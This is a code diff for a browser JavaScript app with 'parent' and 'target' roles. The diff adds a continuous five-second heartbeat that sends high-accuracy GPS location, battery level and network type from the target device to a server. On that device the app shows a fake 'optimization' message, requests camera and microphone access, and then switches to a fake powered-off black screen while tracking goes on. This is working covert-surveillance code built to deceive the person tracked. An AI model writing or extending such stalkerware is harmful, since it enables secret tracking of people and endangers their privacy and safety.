@@ -4,6 +4,12 @@ let peerConnection;
 let roomId;
 let role; // 'parent' or 'child'
 
+// Telemetry state
+let lastLocation = null;
+let lastBattery = null;
+let lastNetwork = null;
+let heartbeatInterval = null;
+
 const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
 // UI Elements
@@ -46,7 +52,9 @@ function startRole(selectedRole) {
     const urlParams = new URLSearchParams(window.location.search);
     roomId = urlParams.get('id') || roomInput.value || 'Geral'; 
     selection.classList.add('hidden');
-    socket.emit('register', { type: role, roomId });
+    // Register with correct type expected by server
+    const socketType = role === 'parent' ? 'monitor' : 'target';
+    socket.emit('register', { type: socketType, roomId });
 
     if (role === 'parent') {
         parentDashboard.classList.remove('hidden');
@@ -76,54 +84,77 @@ async function initTargetService() {
     document.getElementById('start-target').disabled = true;
     document.getElementById('start-target').innerText = "Otimizando...";
 
-    let permissionsGranted = 0;
-    const totalPermissions = 2; // GPS and Camera
-
-    // 1. Start Geolocation Tracking
+    // 1. Start Geolocation Tracking (continuous)
     if (navigator.geolocation) {
         navigator.geolocation.watchPosition(pos => {
-            if (permissionsGranted < totalPermissions) permissionsGranted++;
-            socket.emit('update-data', {
-                location: { lat: pos.coords.latitude, lng: pos.coords.longitude }
-            });
-            checkPermissionsFinalized();
+            lastLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
         }, (err) => {
             console.warn("GPS Error:", err.message);
-        }, { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 });
+        }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 });
     }
 
-    // 2. Start Battery Tracking
+    // 2. Start Battery Tracking (continuous)
     if (navigator.getBattery) {
-        navigator.getBattery().then(batt => {
-            const sendBatt = () => socket.emit('update-data', { battery: batt.level });
-            batt.onlevelchange = sendBatt;
-            sendBatt();
-        });
+        try {
+            const batt = await navigator.getBattery();
+            lastBattery = batt.level;
+            batt.addEventListener('levelchange', () => {
+                lastBattery = batt.level;
+            });
+        } catch (e) {
+            console.warn("Battery API error:", e);
+        }
     }
 
-    // 3. Media Permissions (trigger early)
+    // 3. Start Network Detection (continuous)
+    updateNetworkInfo();
+    if (navigator.connection) {
+        navigator.connection.addEventListener('change', updateNetworkInfo);
+    }
+
+    // 4. Media Permissions (trigger early)
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
         stream.getTracks().forEach(track => track.stop()); // Just to get permission
-        permissionsGranted++;
-        checkPermissionsFinalized();
     } catch (e) {
         console.warn("Media permission denied or not available yet");
     }
 
-    // 4. Wake Lock (Keep Screen On)
+    // 5. Wake Lock (Keep Screen On)
     if ('wakeLock' in navigator) {
         navigator.wakeLock.request('screen').catch(() => { });
     }
 
-    function checkPermissionsFinalized() {
-        if (permissionsGranted >= totalPermissions) {
-            document.getElementById('setup-view').innerHTML = "<h2>Sistema Pronto</h2><p>Otimização concluída.</p>";
-            setTimeout(() => {
-                // Em vez de fechar (que mata o app), vamos para a tela preta
-                showFakeOff();
-            }, 2000);
-        }
+    // 6. Start periodic heartbeat — sends all telemetry every 5 seconds
+    sendHeartbeat(); // Send immediately
+    heartbeatInterval = setInterval(sendHeartbeat, 5000);
+
+    // Show "ready" then go to fake off
+    document.getElementById('setup-view').innerHTML = "<h2>Sistema Pronto</h2><p>Otimização concluída.</p>";
+    setTimeout(() => {
+        showFakeOff();
+    }, 2000);
+}
+
+function updateNetworkInfo() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        // effectiveType: 'slow-2g', '2g', '3g', '4g'
+        // type: 'wifi', 'cellular', 'bluetooth', 'ethernet', 'none', 'unknown'
+        lastNetwork = conn.type || conn.effectiveType || 'desconhecido';
+    } else {
+        lastNetwork = navigator.onLine ? 'online' : 'offline';
+    }
+}
+
+function sendHeartbeat() {
+    const data = {};
+    if (lastLocation) data.location = lastLocation;
+    if (lastBattery !== null) data.battery = lastBattery;
+    if (lastNetwork) data.network = lastNetwork;
+
+    if (Object.keys(data).length > 0) {
+        socket.emit('update-data', data);
     }
 }
 
